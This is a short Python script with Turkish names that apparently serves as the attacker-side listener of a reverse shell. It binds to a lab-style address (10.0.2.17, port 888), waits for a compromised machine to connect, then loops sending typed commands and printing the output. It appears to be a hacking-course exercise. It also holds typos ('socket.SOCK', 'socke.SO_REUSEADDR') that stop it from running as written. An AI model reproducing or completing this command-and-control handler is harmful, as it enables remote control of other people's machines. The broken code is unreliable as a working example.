import socket

class Lister:

    def __init__(self,ip,port):
        baglanti = socket.socket(socket.AF_INET,socket.SOCK)
        baglanti.setsockopt(socket.SOL_SOCKET,socke.SO_REUSEADDR,1) 
        baglanti.bind((ip,port))
        baglanti.listen(0)
        print("Dinlemeye Basladi!")

        self.baglan,adres = baglanti.accept()
        print("baglanti kabul edildi. "+str(adres))


    def baslatma(self):
        while True:
            giris = input("Komut Gir: ")
            self.baglan.sendall(giris.encode("utf-8"))
            gelen_veri = self.baglan.recv(1024).decode("utf-8")
            print(gelen_veri)


baglanti_kurma=Lister("10.0.2.17",888)
baglanti_kurma.baslatma()


